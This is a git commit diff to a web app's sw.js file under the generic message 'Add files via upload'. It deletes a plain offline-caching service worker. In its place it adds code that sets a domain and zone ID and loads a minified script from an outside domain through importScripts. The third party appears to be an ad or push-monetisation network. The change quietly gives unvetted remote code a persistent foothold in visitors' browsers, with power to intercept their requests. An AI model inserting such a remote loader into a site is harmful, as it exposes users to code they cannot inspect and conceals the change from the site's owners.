00815094c5fc18c2bd0dc579fa2ff29e4b0f8b08
Zed-44 <zedahgp@gmail.com>
2026-07-19 23:53:24 +0800

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,14 +1,6 @@
-const CACHE_NAME = 'my-manifest-v1';
-const ASSETS = ['.', 'index.html', 'manifest.json'];
-
-self.addEventListener('install', (event) => {
-    event.waitUntil(caches.open(CACHE_NAME).then((cache) => cache.addAll(ASSETS)));
-});
-
-self.addEventListener('activate', (event) => {
-    event.waitUntil(caches.keys().then((keys) => Promise.all(keys.filter((k) => k !== CACHE_NAME).map((k) => caches.delete(k)))));
-});
-
-self.addEventListener('fetch', (event) => {
-    event.respondWith(caches.match(event.request).then((cached) => cached || fetch(event.request)));
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11348499
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
